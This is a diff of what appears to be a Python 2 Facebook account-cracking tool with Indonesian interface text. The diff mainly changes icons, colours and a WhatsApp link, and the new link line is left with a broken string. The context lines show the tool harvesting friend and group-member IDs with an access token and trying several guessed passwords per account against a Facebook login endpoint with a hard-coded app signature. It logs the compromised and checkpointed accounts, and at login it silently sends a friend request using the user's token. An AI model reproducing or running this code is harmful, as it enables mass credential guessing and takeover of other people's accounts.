@@ -152,7 +152,7 @@ def login():
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Berhasil'
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
-				os.system('xdg-open https://www.youtube.com/omaliptv')
+				os.system('xdg-open https://wa.me/6281273996358)
 				menu()
 			except requests.exceptions.ConnectionError:
 				print"\n\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
@@ -259,7 +259,7 @@ def pilih_super():
 		os.system('clear')
 		print logo
 		print 42*"\033[1;96m="
-		jalan('\033[1;96m[✺] \033[1;93mMengambil ID \033[1;97m...')
+		jalan('\033[1;96m[۝] \033[1;93mMengambil ID \033[1;97m...')
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for s in z['data']:
@@ -277,7 +277,7 @@ def pilih_super():
 			print"\033[1;96m[!] \x1b[1;91mTeman tidak ditemukan!"
 			raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
 			super()
-		jalan('\033[1;96m[✺] \033[1;93mMengambil ID \033[1;97m...')
+		jalan('\033[1;96m[۝] \033[1;93mMengambil ID \033[1;97m...')
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for i in z['data']:
@@ -295,7 +295,7 @@ def pilih_super():
 			print"\033[1;96m[!] \x1b[1;91mGroup tidak ditemukan"
 			raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
 			super()
-		jalan('\033[1;96m[✺] \033[1;93mMengambil ID \033[1;97m...')
+		jalan('\033[1;96m[۝] \033[1;93mMengambil ID \033[1;97m...')
 		re=requests.get('https://graph.facebook.com/'+idg+'/members?fields=name,id&limit=999999999&access_token='+toket)
 		s=json.loads(re.text)
 		for p in s['data']:
@@ -341,15 +341,15 @@ def pilih_super():
 			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 			q = json.load(data)
 			if 'access_token' in q:
-				print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
-				print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
+				print '\x1b[1;96m[✓] \x1b[1;32mBERHASIL'
+				print '\x1b[1;96m[۝] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
 				print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
 				print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass1 + '\n'
 				oks.append(user+pass1)
 			else:
 				if 'www.facebook.com' in q["error_msg"]:
 					print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
-					print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
+					print '\x1b[1;96m[۝] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
 					print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
 					print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass1 + '\n'
 					cek = open("out/super_cp.txt", "a")
@@ -362,14 +362,14 @@ def pilih_super():
 					q = json.load(data)
 					if 'access_token' in q:
 						print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
-						print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
+						print '\x1b[1;96m[۝] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
 						print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
 						print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass2 + '\n'
 						oks.append(user+pass2)
 					else:
 						if 'www.facebook.com' in q["error_msg"]:
 							print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
-							print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
+							print '\x1b[1;96m[۝] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
 							print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
 							print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass2 + '\n'
 							cek = open("out/super_cp.txt", "a")
@@ -382,14 +382,14 @@ def pilih_super():
 							q = json.load(data)
 							if 'access_token' in q:
 								print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
-								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
+								print '\x1b[1;96m[۝] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
 								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
 								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass3 + '\n'
 								oks.append(user+pass3)
 							else:
 								if 'www.facebook.com' in q["error_msg"]:
 									print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
-									print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
+									print '\x1b[1;96m[۝] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
 									print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
 									print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass3 + '\n'
 									cek = open("out/super_cp.txt", "a")
@@ -402,14 +402,14 @@ def pilih_super():
 									q = json.load(data)
 									if 'access_token' in q:
 										print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
-										print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
+										print '\x1b[1;96m[۝] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
 										print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
 										print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass4 + '\n'
 										oks.append(user+pass4)
 									else:
 										if 'www.facebook.com' in q["error_msg"]:
 											print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
-											print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
+											print '\x1b[1;96m[۝] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
 											print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
 											print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass4 + '\n'
 											cek = open("out/super_cp.txt", "a")
@@ -423,14 +423,14 @@ def pilih_super():
 											q = json.load(data)
 											if 'access_token' in q:
 												print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
-												print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
+												print '\x1b[1;96m[۝] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
 												print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
 												print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass5 + '\n'
 												oks.append(user+pass5)
 											else:
 												if 'www.facebook.com' in q["error_msg"]:
 													print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
-													print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
+													print '\x1b[1;96m[۝] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
 													print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
 													print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass5 + '\n'
 													cek = open("out/super_cp.txt", "a")
@@ -443,14 +443,14 @@ def pilih_super():
 													q = json.load(data)
 													if 'access_token' in q:
 														print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
-														print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
+														print '\x1b[1;96m[۝] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
 														print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
 														print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass6 + '\n'
 														oks.append(user+pass6)
 													else:
 														if 'www.facebook.com' in q["error_msg"]:
 															print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
-															print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
+															print '\x1b[1;96m[۝] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
 															print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
 															print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass6 + '\n'
 															cek = open("out/super_cp.txt", "a")
